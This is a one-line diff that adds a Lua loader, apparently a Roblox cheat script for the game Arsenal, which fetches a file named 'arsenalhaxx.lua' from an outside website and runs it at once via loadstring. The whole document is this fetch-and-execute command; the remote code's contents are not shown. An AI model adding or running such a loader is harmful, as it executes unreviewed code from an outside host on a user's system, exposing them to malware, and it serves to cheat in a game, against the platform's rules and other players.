@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://system-exodus.com/scripts/arsenal/arsenalhaxx.lua",true))()
